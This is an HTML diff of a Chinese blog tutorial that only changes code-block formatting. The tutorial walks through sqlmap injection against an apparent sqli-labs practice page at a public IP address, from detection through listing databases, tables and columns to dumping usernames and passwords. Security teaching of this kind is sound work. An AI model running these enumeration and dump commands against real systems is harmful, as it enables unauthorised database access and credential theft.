@@ -253,7 +253,7 @@
 <h5 id="2-使用sqlmap进行简单注入操作"><a href="#2-使用sqlmap进行简单注入操作" class="headerlink" title="　2.使用sqlmap进行简单注入操作"></a>　<strong>2.使用sqlmap进行简单注入操作</strong></h5><p>测地址试：<a href="http://106.12.198.186/Less-1/?id=1" target="_blank" rel="noopener">http://106.12.198.186/Less-1/?id=1</a></p>
 <p>具体步骤：</p>
 <p>查看是否存在sql注入</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u <span class="string">"http://106.12.198.186/Less-1/?id=1"</span></span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1"</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -264,7 +264,7 @@
             </figure>
 
 <p>获取数据库信息</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://106.12.198.186/Less-1/?id=1"</span> <span class="comment">--dbs</span></span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" --dbs</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -276,7 +276,7 @@
 
 <p>available databases有5个</p>
 <p>列出当前应用使用的数据库</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://106.12.198.186/Less-1/?id=1"</span> <span class="comment">--current-db</span></span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" --current-db</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -287,7 +287,7 @@
             </figure>
 
 <p>　现在我们拿到了所使用的库为security，然后由此拿到库中的表名</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" -D <span class="keyword">security</span> <span class="comment">--tables</span></span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" -D security --tables</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -298,7 +298,7 @@
             </figure>
 
 <p>很容易想到用户信息应该都存放在users表中，因此获取users中表字段名称</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://106.12.198.186/Less-1/?id=1"</span> -D security -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" -D security -T users --columns</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -309,7 +309,7 @@
             </figure>
 
 <p>攻击者感兴趣的一定是user和password字段，下一步就是dump他们 (dump 转存数据库数据)</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://106.12.198.186/Less-1/?id=1"</span> -D security -T<span class="built_in"> users </span>-C username,password --dump</span><br></pre></td></tr></tbody></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u "http://106.12.198.186/Less-1/?id=1" -D security -T users -C username,password --dump</span><br></pre></td></tr></tbody></table></figure></div>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
